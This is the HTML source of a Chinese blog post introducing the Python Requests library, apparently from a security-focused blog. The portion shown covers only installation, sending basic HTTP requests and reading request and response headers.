@@ -1,0 +1,2258 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Python模块-Requests学习与CTF和AWD实战, 简简,简简博客,网络安全,计算机,Java开发">
+    <meta name="description" content="
+
+Requests is the only Non-GMO HTTP library for Python, safe for human consumption.
+
+前言为什么学习Requests模块呢，因为最近老是遇见它，自己又不太懂">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta http-equiv="Content-Type" content="text/html;charset=gb2312" />
+    <meta name="sogou_site_verification" content="VTcD33rrfd" />
+    <meta name="google-site-verification" content="mHsYpjV9Rl0e0UzjioJFLg8RMtOhxw8HB3D21dIWvmc" />
+	<meta name="referrer" content="unsafe-url">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Python模块-Requests学习与CTF和AWD实战 | 简言之</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+	<!--变灰-->
+	<!-- <link href="http://static.isenyu.cn/file/css/MemorialDay.css"; rel="stylesheet" type="text/css" /> -->
+    <!-- <style type="text/css">
+     html{ filter: grayscale(100%); /* 标准写法 just for IE6-9 */ 
+        -webkit-filter: grayscale(100%); /* webkit 内核支持程度较好 */ 
+        -moz-filter: grayscale(100%); /* 其他内核现在并不支持，为了将来兼容性书写 */ 
+        -ms-filter: grayscale(100%); 
+        -o-filter: grayscale(100%); filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);
+        filter: url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'><filter id=\'grayscale\'><feColorMatrix type=\'matrix\' values=\'0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\'/></filter></svg>#grayscale"); /* Firefox 3.5+ */ }
+     </style> -->
+    <link rel="stylesheet" type="text/css" href="https://cdn.staticfile.org/font-awesome/6.0.0/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.staticfile.org/aos/0.1.0/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="https://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.3.min.js"></script>
+	<!--valine_人机验证-->
+	<script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+	<script src="/js/Valine-RJyanzheng.js"></script>
+
+    
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img no-lazy src="/medias/logo.png" class="logo-img" alt="">
+                    
+                    <span class="logo-span">简言之</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Home</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-user-secret" style="zoom: 0.6;"></i>
+      
+      <span>Sec</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/Web/">
+          
+          <i class="fab fa-internet-explorer" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Web</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/CTF/">
+          
+          <i class="fas fa-flag" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>CTF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Crypto/">
+          
+          <i class="fa-solid fa-shield" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Data</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fab fa-java" style="zoom: 0.6;"></i>
+      
+      <span>Java</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/JavaSE/">
+          
+          <i class="fa-solid fa-mug-saucer" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>JavaSE</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/JavaWeb/">
+          
+          <i class="fa-solid fa-earth-americas" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>JavaWeb</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Spring/">
+          
+          <i class="fa-solid fa-leaf" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Spring</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Q-A/">
+          
+          <i class="fa-solid fa-bell" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Q&A</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fa-solid fa-desktop" style="zoom: 0.6;"></i>
+      
+      <span>CS</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/CS%E5%9F%BA%E7%A1%80/">
+          
+          <i class="fa-solid fa-server" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>CS基础</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/SQL/">
+          
+          <i class="fas fa-database" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>数据库</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E7%BB%93%E6%9E%84-%E7%AE%97%E6%B3%95/">
+          
+          <i class="fa-solid fa-bezier-curve" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>结构-算法</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-layer-group" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/Python/">
+          
+          <i class="fab fa-python" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Python</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Course/">
+          
+          <i class="fa-solid fa-graduation-cap" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Course</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Share/">
+          
+          <i class="fa-solid fa-crown" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Share~</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Tools/">
+          
+          <i class="fas fa-tools" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tools~</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>整理</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags/">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>归类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives/">
+          
+          <i class="fas fa-file-contract" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>归档</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fa-solid fa-paper-plane" style="zoom: 0.6;"></i>
+      
+      <span>交流</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/friends/">
+          
+          <i class="fas fa-venus-mars" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>友链</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/contact/">
+          
+          <i class="fas fa-envelope" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>留言</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about/" class="waves-effect waves-light">
+      
+      <i class="fas fa-id-card-alt" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img no-lazy src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">简言之</div>
+        <div class="logo-desc">
+            
+            悄无声息地变坚强，安静地变优秀！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Home
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-user-secret"></i>
+			
+			Sec
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/Web/ " style="margin-left:50px";>
+				  
+				   <i class="fab fa-internet-explorer" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Web</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/CTF/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-flag" style="position: absolute;left:28px" ></i>
+			      
+		          <span>CTF</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Crypto/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-shield" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Data</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fab fa-java"></i>
+			
+			Java
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/JavaSE/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-mug-saucer" style="position: absolute;left:28px" ></i>
+			      
+		          <span>JavaSE</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/JavaWeb/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-earth-americas" style="position: absolute;left:28px" ></i>
+			      
+		          <span>JavaWeb</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Spring/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-leaf" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Spring</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Q-A/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-bell" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Q&A</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fa-solid fa-desktop"></i>
+			
+			CS
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/CS%E5%9F%BA%E7%A1%80/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-server" style="position: absolute;left:28px" ></i>
+			      
+		          <span>CS基础</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/SQL/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-database" style="position: absolute;left:28px" ></i>
+			      
+		          <span>数据库</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/%E7%BB%93%E6%9E%84-%E7%AE%97%E6%B3%95/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-bezier-curve" style="position: absolute;left:28px" ></i>
+			      
+		          <span>结构-算法</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-layer-group"></i>
+			
+			Others
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/Python/ " style="margin-left:50px";>
+				  
+				   <i class="fab fa-python" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Python</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Course/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-graduation-cap" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Course</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Share/ " style="margin-left:50px";>
+				  
+				   <i class="fa-solid fa-crown" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Share~</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/Tools/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-tools" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Tools~</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			整理
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-bookmark" style="position: absolute;left:28px" ></i>
+			      
+		          <span>归类</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/archives/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-file-contract" style="position: absolute;left:28px" ></i>
+			      
+		          <span>归档</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fa-solid fa-paper-plane"></i>
+			
+			交流
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/friends/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-venus-mars" style="position: absolute;left:28px" ></i>
+			      
+		          <span>友链</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/contact/ " style="margin-left:50px";>
+				  
+				   <i class="fas fa-envelope" style="position: absolute;left:28px" ></i>
+			      
+		          <span>留言</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-id-card-alt"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('猜猜密码是什么呢ヾﾉ≧∀≦)o')).toString(CryptoJS.enc.Hex)) {
+                alert('哎呦！密码好像不对哟，将返回主页！');
+                location.href = '/';	
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://img.jwt1399.top//img/20200824173112.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Python模块-Requests学习与CTF和AWD实战</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    /*.toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }*/
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+        /* 毛玻璃 */
+        /*background-color: rgba(162,101,228, 0.08);*/
+        /*backdrop-filter: saturate(180%) blur(20px);*/
+        /*目录样式修改*/
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Requests/">
+                                <span class="chip bg-color">Requests</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-08-08
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2022-11-24
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.6k
+                </div>
+                
+
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><img src="https://img.jwt1399.top//img/20200824173112.png"></p>
+<blockquote>
+<p>Requests is the only Non-GMO HTTP library for Python, safe for human consumption.</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为什么学习<code>Requests</code>模块呢，因为最近老是遇见它，自己又不太懂，加之在很多<code>Web</code>的<code>poc</code>里面<code>Requests</code>模块的出镜率很高，于是特此学习记录之。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>Requests</code>是一个简单方便的<code>HTTP 库</code>。比<code>Python</code>标准库中的<code>urllib2</code>模块功能强大。Requests 使用的是 urllib3，因此继承了它的所有特性。Requests 支持使用<code>cookie</code> 保持会话，支持文件上传，支持自动确定响应内容的编码，支持<code>URL</code> 和 <code>POST</code> 数据自动编码。帮助我们轻松解决关于<code>HTTP</code>的大部分问题。</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>方法一</strong>：<br>只要在你的终端中运行这个简单命令即可：</p>
+<pre><code>$ pip install requests
+</code></pre>
+<p>如果你没有安装<code>Python</code>，这个 <a target="_blank" rel="noopener" href="https://docs.python-guide.org/starting/installation/">Python installation guide</a> 可以带你完成这一流程。</p>
+<p><strong>方法二</strong><br>你可以克隆公共版本库：</p>
+<pre><code>git clone git://github.com/kennethreitz/requests.git
+</code></pre>
+<p>获得代码之后，你就可以轻松的将它嵌入到你的 python 包里</p>
+<pre><code>cd requests
+python setup.py install
+</code></pre>
+<p>或者放到你的<code>Python27\Lib\site-packages</code>目录下</p>
+<p>能导入requests，即安装成功</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> requests
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Requests常用方法"><a href="#Requests常用方法" class="headerlink" title="Requests常用方法"></a>Requests常用方法</h2><p>所有示例都是以Github官网（<a target="_blank" rel="noopener" href="https://github.com/%EF%BC%89%E4%B8%BA%E4%BE%8B">https://github.com/）为例</a></p>
+<h3 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h3><p>发起<code>GET</code>请求;</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发起<code>POST</code>请求：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/post'</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span><span class="token string">'value'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其他<code> HTTP</code> 请求类型：<code>PUT，DELETE，HEAD 以及 OPTIONS</code>,都是一样的简单</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span><span class="token string">'value'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">'https://github.com/delete'</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token string">'https://github.com//get'</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>options<span class="token punctuation">(</span><span class="token string">'https://github.com/get'</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>现在，我们有一个名为<code>r</code>的<code>Response</code>对象。我们可以从这个对象中获取所有我们想要的信息。</p>
+<h3 id="查看请求头"><a href="#查看请求头" class="headerlink" title="查看请求头"></a>查看请求头</h3><p>以查看<code>GET</code>请求的请求头为例，<code>POST</code>请求同理：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers
+<span class="token punctuation">{</span><span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span> <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span> <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'*/*'</span><span class="token punctuation">,</span> <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'python-requests/2.22.0'</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>查看请求头的某一属性：(大小写不影响)</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Accept-Encoding'</span><span class="token punctuation">]</span>
+<span class="token string">'gzip, deflate'</span>
+<span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user-agent'</span><span class="token punctuation">)</span>
+<span class="token string">'python-requests/2.22.0'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h3><p>查看GET请求的响应头为例，POST请求同理：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>headers
+<span class="token punctuation">{</span><span class="token string">'Status'</span><span class="token punctuation">:</span> <span class="token string">'200 OK'</span><span class="token punctuation">,</span> <span class="token string">'Expect-CT'</span><span class="token punctuation">:</span> <span class="token string">'max-age=2592000, report-uri="https://api.github.com/_private/browser/errors"'</span><span class="token punctuation">,</span> <span class="token string">'X-Request-Id'</span><span class="token punctuation">:</span> <span class="token string">'45a5c520-bb73-4677-b30c-19300dcf6f38'</span><span class="token punctuation">,</span> <span class="token string">'X-XSS-Protection'</span><span class="token punctuation">:</span> <span class="token string">'1; mode=block'</span><span class="token punctuation">,</span> <span class="token string">'Content-Security-Policy'</span><span class="token punctuation">:</span> "default<span class="token operator">-</span>src <span class="token string">'none'</span><span class="token punctuation">;</span> base<span class="token operator">-</span>uri <span class="token string">'self'</span><span class="token punctuation">;</span> block<span class="token operator">-</span>all<span class="token operator">-</span>mixed<span class="token operator">-</span>content<span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>查看响应头的某一属性：(大小写不影响)</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Status'</span><span class="token punctuation">]</span>
+<span class="token string">'200 OK'</span>
